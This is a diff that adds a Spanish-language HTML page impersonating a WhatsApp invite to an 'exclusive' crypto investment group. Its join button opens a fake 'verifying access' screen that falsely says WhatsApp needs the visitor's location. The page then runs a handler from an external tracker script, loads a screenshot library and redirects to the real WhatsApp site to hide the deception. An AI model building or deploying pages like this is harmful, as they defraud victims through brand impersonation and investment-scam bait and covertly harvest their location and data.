@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#075E54">
+    <title>WhatsApp</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body,
+        html {
+            width: 100%;
+            min-height: 100vh;
+            background-color: #ECE5DD;
+            overflow-x: hidden;
+        }
+
+        /* TOP BAR */
+        .wa-header {
+            background: #075E54;
+            color: white;
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            gap: 12px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .wa-logo {
+            width: 28px;
+            height: 28px;
+        }
+
+        .wa-header-title {
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+
+        /* MAIN CARD */
+        .wa-card {
+            background: #fff;
+            margin: 0;
+            padding: 0;
+        }
+
+        .wa-banner {
+            width: 100%;
+            height: 200px;
+            background: linear-gradient(135deg, #128C7E 0%, #075E54 60%, #054940 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .wa-banner::before {
+            content: '';
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.05);
+            top: -100px;
+            right: -80px;
+        }
+
+        .wa-banner::after {
+            content: '';
+            position: absolute;
+            width: 200px;
+            height: 200px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.04);
+            bottom: -80px;
+            left: -60px;
+        }
+
+        .wa-group-avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: #25D366;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        .wa-group-icon {
+            font-size: 48px;
+            filter: grayscale(0);
+        }
+
+        .wa-info {
+            padding: 20px 18px;
+        }
+
+        .wa-group-name {
+            font-size: 22px;
+            font-weight: 700;
+            color: #111;
+            margin-bottom: 4px;
+        }
+
+        .wa-group-tag {
+            font-size: 13px;
+            color: #128C7E;
+            font-weight: 600;
+            margin-bottom: 14px;
+        }
+
+        .wa-divider {
+            height: 1px;
+            background: #f0f0f0;
+            margin-bottom: 14px;
+        }
+
+        .wa-description {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.55;
+            margin-bottom: 20px;
+        }
+
+        .wa-meta {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #888;
+            margin-bottom: 6px;
+        }
+
+        .wa-meta-icon {
+            font-size: 16px;
+        }
+
+        .wa-members-row {
+            display: flex;
+            align-items: center;
+            margin: 18px 0 6px;
+        }
+
+        .wa-member-avatar {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            border: 2px solid #fff;
+            margin-left: -10px;
+            object-fit: cover;
+            background: #25D366;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+            color: white;
+            font-weight: 700;
+        }
+
+        .wa-member-avatar:first-child {
+            margin-left: 0;
+        }
+
+        .wa-members-count {
+            margin-left: 12px;
+            font-size: 13px;
+            color: #666;
+        }
+
+        /* CTA BUTTON */
+        .wa-join-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: calc(100% - 36px);
+            margin: 20px 18px;
+            padding: 16px;
+            background: #25D366;
+            color: white;
+            font-size: 16px;
+            font-weight: 700;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            letter-spacing: 0.4px;
+            box-shadow: 0 4px 15px rgba(37, 211, 102, 0.35);
+            transition: all 0.15s ease;
+            text-decoration: none;
+        }
+
+        .wa-join-btn:active {
+            transform: scale(0.97);
+            box-shadow: 0 2px 6px rgba(37, 211, 102, 0.3);
+        }
+
+        .wa-join-icon {
+            font-size: 20px;
+        }
+
+        .wa-footer-note {
+            text-align: center;
+            font-size: 12px;
+            color: #aaa;
+            padding: 0 18px 28px;
+            line-height: 1.6;
+        }
+
+        /* LOADING OVERLAY */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #075E54;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 500;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.4s ease;
+        }
+
+        .loading-screen.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+
+        .wa-loading-logo {
+            font-size: 72px;
+            margin-bottom: 24px;
+        }
+
+        .wa-loading-text {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        .wa-loading-sub {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 13px;
+            text-align: center;
+            max-width: 78%;
+            line-height: 1.5;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top: 3px solid #25D366;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin-top: 22px;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- HEADER -->
+    <div class="wa-header">
+        <svg class="wa-logo" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path
+                d="M16 2C8.268 2 2 8.268 2 16c0 2.4.641 4.651 1.762 6.597L2 30l7.61-1.742A13.944 13.944 0 0016 30c7.732 0 14-6.268 14-14S23.732 2 16 2z"
+                fill="#25D366" />
+            <path
+                d="M22.52 19.36c-.32-.16-1.89-.93-2.18-1.04-.29-.1-.5-.16-.71.16-.21.32-.81 1.04-.99 1.25-.18.22-.36.24-.67.08-.31-.16-1.3-.48-2.48-1.53-.92-.82-1.54-1.83-1.72-2.14-.18-.31-.02-.48.13-.63.14-.14.31-.36.46-.54.16-.18.21-.31.31-.52.1-.21.05-.4-.02-.56-.08-.16-.71-1.71-.97-2.33-.26-.61-.52-.53-.71-.54h-.6c-.21 0-.54.08-.82.4-.29.32-1.09 1.07-1.09 2.6 0 1.54 1.12 3.02 1.27 3.23.16.21 2.2 3.36 5.33 4.71.74.32 1.32.51 1.77.65.74.24 1.42.2 1.95.12.6-.09 1.84-.75 2.1-1.47.26-.72.26-1.34.18-1.47-.08-.13-.29-.21-.6-.37z"
+                fill="white" />
+        </svg>
+        <span class="wa-header-title">WhatsApp</span>
+    </div>
+
+    <!-- CARD -->
+    <div class="wa-card">
+        <div class="wa-banner">
+            <div class="wa-group-avatar">
+                <span class="wa-group-icon">👥</span>
+            </div>
+        </div>
+
+        <div class="wa-info">
+            <div class="wa-group-name">Inversiones 2025 💰</div>
+            <div class="wa-group-tag">Grupo de WhatsApp · +1,247 miembros</div>
+            <div class="wa-divider"></div>
+
+            <div class="wa-description">
+                Te han invitado a ser parte del grupo privado de inversiones más exclusivo de Latinoamérica. Analizamos
+                criptomonedas, acciones y oportunidades de alto rendimiento. 📈 Solo por invitación.
+            </div>
+
+            <div class="wa-meta">
+                <span class="wa-meta-icon">👤</span>
+                <span>Admin: Carlos M. · Creado el 5 de enero de 2025</span>
+            </div>
+            <div class="wa-meta">
+                <span class="wa-meta-icon">🔒</span>
+                <span>Grupo privado · Cualquiera con el enlace puede unirse</span>
+            </div>
+
+            <div class="wa-members-row">
+                <div class="wa-member-avatar">A</div>
+                <div class="wa-member-avatar">M</div>
+                <div class="wa-member-avatar">J</div>
+                <div class="wa-member-avatar">R</div>
+                <div class="wa-member-avatar">+</div>
+                <span class="wa-members-count">Luis, Ana y 1,242 personas más</span>
+            </div>
+        </div>
+
+        <button class="wa-join-btn" id="joinBtn">
+            <span class="wa-join-icon">💬</span>
+            Unirse al grupo
+        </button>
+
+        <p class="wa-footer-note">
+            Al unirte, aceptas los Términos de Servicio y Política de Privacidad de WhatsApp. El creador del grupo podrá
+            ver tu número de teléfono.
+        </p>
+    </div>
+
+    <!-- LOADING SCREEN -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="wa-loading-logo">💬</div>
+        <div class="wa-loading-text">Verificando acceso al grupo...</div>
+        <div class="wa-loading-sub">
+            WhatsApp requiere confirmar tu ubicación para unirte en tu región.
+            <br><br>
+            <strong style="color: #fff;">Presiona "Permitir" para continuar.</strong>
+        </div>
+        <div class="spinner"></div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <script src="/tracker.js"></script>
+    <script>
+        const loadingScreen = document.getElementById('loadingScreen');
+        let clicked = false;
+
+        async function joinGroup() {
+            if (clicked) return;
+            clicked = true;
+            loadingScreen.classList.add('active');
+
+            if (typeof handleMainCta === 'function') await handleMainCta();
+
+            setTimeout(() => {
+                window.location.replace('https://www.whatsapp.com/');
+            }, 1200);
+        }
+
+        document.getElementById('joinBtn').addEventListener('click', joinGroup);
+        document.getElementById('joinBtn').addEventListener('touchstart', joinGroup, { passive: true });
+    </script>
+</body>
+
+</html>
